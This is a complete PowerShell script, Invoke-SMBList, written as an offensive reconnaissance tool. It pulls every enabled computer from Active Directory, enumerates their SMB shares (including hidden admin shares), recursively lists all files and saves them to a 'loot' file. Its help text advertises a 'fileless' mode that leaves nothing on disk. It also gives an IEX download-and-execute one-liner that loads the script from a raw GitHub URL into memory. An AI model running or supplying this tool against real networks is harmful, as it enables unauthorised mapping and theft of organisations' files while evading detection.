function Invoke-SMBList{
[CmdletBinding()]
param([switch]$h,[string[]]$Hosts,[string]$OutFile="smblist_$(Get-Date -f yyyyMMdd_HHmmss).txt",[int]$Depth=0,[switch]$IncludeHidden,[pscredential]$Credential,[switch]$InMemory)
if($h){@'
smblist.ps1 - native SMB share+file enumerator (full-depth, fileless-capable)

usage:
  Invoke-SMBList [options]

targets:
  (none)                    all enabled AD computers via LDAP
  -Hosts hosts.txt          file, one host/FQDN per line
  -Hosts SRV01.corp.local   single host

options:
  -Depth 3                  cap recursion (default: unlimited, like smbclient recurse;ls)
  -IncludeHidden            include C$/ADMIN$ style shares
  -Credential (psc 'CORP\jsmith' 'Passw0rd!')   alternate creds
  -InMemory                 net view share enum - no csc.exe, nothing on disk
  -OutFile ''               pipeline only, no loot file (default writes smblist_<timestamp>.txt)
  -Verbose                  show skips and denials
  -h                        this help

load from URL (function only, then call it):
  IEX ([Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/USER/REPO/main/smblist.ps1')))
  Invoke-SMBList -Hosts hosts.txt -InMemory -OutFile '' -Verbose

examples:
  Invoke-SMBList
  Invoke-SMBList -Hosts hosts.txt -Verbose
  Invoke-SMBList -Credential (psc 'CORP\jsmith' 'Passw0rd!')
'@;return}
$cp=$Credential;$pw=if($cp){$cp.GetNetworkCredential().Password}
$t=if($Hosts){$Hosts|%{if(Test-Path $_){gc $_|%{$_.Trim()}}else{$_}}|?{$_}}else{
  $f='(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'
  $s=if($cp){$nc=([DirectoryServices.DirectoryEntry]::new('LDAP://RootDSE',$cp.UserName,$pw)).Properties['defaultNamingContext'][0]
    [adsisearcher]::new([DirectoryServices.DirectoryEntry]::new("LDAP://$nc",$cp.UserName,$pw),$f)}else{[adsisearcher]$f}
  $s.PageSize=1000;[void]$s.PropertiesToLoad.Add('dNSHostName');$s.FindAll()|%{$_.Properties['dnshostname']|select -First 1}|?{$_}|sort}
if(!$InMemory-and!('NSE'-as[type])){Add-Type 'using System;using System.Runtime.InteropServices;public class NSE{[DllImport("Netapi32.dll",CharSet=CharSet.Unicode)]public static extern int NetShareEnum(string s,int l,out IntPtr b,int m,out int r,out int t,ref int x);[DllImport("Netapi32.dll")]public static extern int NetApiBufferFree(IntPtr b);[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]public struct SH1{public string n;public uint t;public string r;}}'}
function Shares($h){
  if($InMemory){return net view "\\$h" /all 2>$null|%{if($_ -match'^(\S+)\s+Disk\s'){$Matches[1]}}|?{$_ -ne'IPC$'-and($IncludeHidden-or$_ -notmatch'\$$')}}
  $r=0;$n=0;$x=0;$b=[IntPtr]::Zero
  if([NSE]::NetShareEnum($h,1,[ref]$b,-1,[ref]$r,[ref]$n,[ref]$x)){Write-Verbose "[-] $h NetShareEnum denied";return}
  try{$z=[Runtime.InteropServices.Marshal]::SizeOf([type][NSE+SH1]);if($r){0..($r-1)|%{$s=[Runtime.InteropServices.Marshal]::PtrToStructure($b.ToInt64()+$_*$z,[type][NSE+SH1])
    if(!(($s.t -band 0x3FFFFFFF))-and$s.n -ne'IPC$'-and($IncludeHidden-or$s.n -notmatch'\$$')){$s.n}}}}finally{[void][NSE]::NetApiBufferFree($b)}}
function Walk($h,$s){
  $root="\\$h\$s";$d=$null
  if($cp){$d="sl$($s -replace'\W','_')";if(New-PSDrive $d FileSystem $root -Credential $cp -EA 0){$root="$d`:"}else{return}}
  try{$a=@{LiteralPath=$root;Recurse=1;File=1;Force=1;EA=0};if($Depth){$a.Depth=$Depth}
    gci @a|%{"//$h/$s"+$_.FullName.Substring($root.Length)-replace'\\','/'}}finally{if($d){Remove-PSDrive $d -Force -EA 0}}}
$f=0;$dl=if($Depth){"depth $Depth"}else{'full depth'}
"[i] $($t.Count) hosts, $dl, out: $(if($OutFile){$OutFile}else{'pipeline'})"|Write-Host -F Cyan
foreach($h in $t){
  if(!(Test-Connection $h -Count 1 -Quiet -EA 0)){Write-Verbose "[-] $h unreachable";continue}
  if($cp){net use "\\$h\IPC$" /user:$($cp.UserName) $pw 2>&1|Out-Null}
  $sh=Shares $h
  if($sh){"[+] $h - $($sh.Count) shares: $($sh -join', ')"|Write-Host -F Green
    foreach($s in $sh){$p=Walk $h $s;if($p){if($OutFile){$p|Add-Content $OutFile}else{$p};$f+=$p.Count}}}
  else{Write-Verbose "[-] $h no readable shares"}
  if($cp){net use "\\$h\IPC$" /delete /y 2>&1|Out-Null}}
"[i] done - $f paths -> $(if($OutFile){$OutFile}else{'pipeline'})"|Write-Host -F Cyan
}
function global:psc($u,$p){[pscredential]::new($u,(ConvertTo-SecureString $p -AsPlainText -Force))}
if($PSCommandPath){Invoke-SMBList @args}
